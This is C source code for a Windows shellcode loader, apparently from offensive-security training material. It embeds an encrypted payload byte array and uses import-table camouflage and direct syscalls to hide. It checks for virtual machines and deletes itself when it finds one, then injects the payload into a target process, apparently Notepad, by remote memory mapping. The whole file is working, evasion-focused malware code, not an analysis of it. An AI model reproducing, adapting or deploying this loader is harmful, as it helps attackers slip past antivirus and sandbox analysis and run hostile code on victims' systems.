#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"
#include "IatCamouflage.h"

// comment to inject to the local process
#define TARGET_PROCESS	Notepad_JOAA

UCHAR Payload[] = {
		0x96, 0x7D, 0xC3, 0x42, 0xE0, 0x18, 0xE4, 0xE7, 0x63, 0x44, 0xF5, 0x1E, 0x9F, 0xE5, 0x7A, 0x62,
		0xE5, 0x43, 0x38, 0xF4, 0xED, 0x7C, 0xBC, 0xF2, 0x21, 0x47, 0x5E, 0x84, 0x91, 0x49, 0x0B, 0x08,
		0x20, 0xFC, 0x9D, 0x3E, 0x73, 0xF3, 0xCB, 0x4D, 0xE7, 0xD7, 0xFA, 0xF8, 0x12, 0x2A, 0x1A, 0x13,
		0xDA, 0x23, 0x64, 0xE2, 0x20, 0xCF, 0xF0, 0x78, 0x7A, 0x4F, 0xAA, 0xDC, 0xD3, 0x48, 0x7A, 0x08,
		0x8E, 0x3F, 0x7F, 0x98, 0xB5, 0x2D, 0x0F, 0xC5, 0x80, 0xB8, 0x54, 0x98, 0x0E, 0x7A, 0x03, 0xF8,
		0xB8, 0xE2, 0xF3, 0xF2, 0xD3, 0xBE, 0xFA, 0xDB, 0x38, 0x0E, 0x36, 0x15, 0xB5, 0x98, 0xC6, 0x07,
		0xEA, 0x1C, 0x2F, 0xA8, 0xA8, 0xE1, 0x7C, 0xDC, 0x3B, 0x3C, 0xA0, 0x60, 0x25, 0xE3, 0x26, 0xC1,
		0x0E, 0x88, 0xF9, 0x71, 0xFC, 0x98, 0xF4, 0x65, 0xC9, 0x06, 0x40, 0x25, 0xD6, 0x64, 0x6D, 0x1A,
		0x44, 0xB0, 0xD0, 0xFA, 0x7F, 0x93, 0x40, 0x7A, 0x6E, 0x59, 0xE4, 0xC3, 0x7B, 0x2B, 0x0E, 0x14,
		0x1D, 0x3E, 0x42, 0x75, 0xC8, 0x13, 0xCB, 0xB5, 0xD5, 0x4D, 0xB0, 0x23, 0xE6, 0xB6, 0x54, 0xB1,
		0x1A, 0x0D, 0x9A, 0xFD, 0x81, 0x04, 0xDB, 0x58, 0xF8, 0x7F, 0x0A, 0xA5, 0x5E, 0x42, 0xFB, 0x9D,
		0x95, 0xC6, 0x0F, 0x1A, 0x97, 0x36, 0xDC, 0x28, 0x8B, 0x6C, 0xAC, 0x07, 0x8C, 0xEC, 0x66, 0x63,
		0xF1, 0xEB, 0x3B, 0x71, 0xF0, 0x4F, 0xDF, 0x09, 0xB1, 0xDB, 0x3B, 0x5F, 0xAF, 0x2F, 0x0E, 0xF6,
		0xD8, 0x44, 0xDE, 0x26, 0x15, 0xBA, 0x18, 0xBC, 0x0D, 0x6B, 0xE2, 0x4F, 0xCD, 0xEF, 0x58, 0x24,
		0x57, 0xC8, 0xB6, 0x6A, 0x50, 0xFF, 0xC1, 0x14, 0x74, 0x1D, 0x13, 0xEB, 0xA6, 0x2B, 0x87, 0x52,
		0xE6, 0x83, 0x03, 0xFA, 0xD1, 0x05, 0x2C, 0x82, 0x9E, 0xD8, 0xB1, 0xF2, 0xEF, 0x1C, 0x50, 0x11,
		0xF9, 0xFA, 0x6B, 0xF4, 0x63, 0x61, 0xC7, 0x93, 0x70, 0x4B, 0x77, 0xE2, 0xBC, 0x06, 0x15, 0x56
};

BOOL main() {

	DWORD		dwProcessId = NULL;
	HANDLE		hProcess = NULL;

	IatCamouflage();

	if (!InitializeSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize Syscalls Structure \n");
#endif
		return FALSE;
	}
	
	if (!AntiAnalysis(20000)) {
#ifdef DEBUG
		PRINTA("[!] Detected A Virtualized Environment \n");
#endif
		DeleteSelf();
		return FALSE;
	}
	
#ifdef TARGET_PROCESS
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &dwProcessId, &hProcess)) {
#ifdef DEBUG
		PRINTA("[!] Could Not Find Target Process Id \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Target Process Id Detected Of PID : %d \n", dwProcessId);
#endif

	if (!RemoteMappingInjectionViaSyscalls(hProcess, Payload, sizeof(Payload), FALSE)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Inject Payload \n");
#endif
		return FALSE;
	}


#endif 
	// TARGET_PROCESS
#ifndef TARGET_PROCESS
	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
#ifdef DEBUG
		PRINTA("[!] Failed To Inject Payload \n");
#endif
	return FALSE;
}

#endif 
	// !TARGET_POCESS
	return TRUE;
}
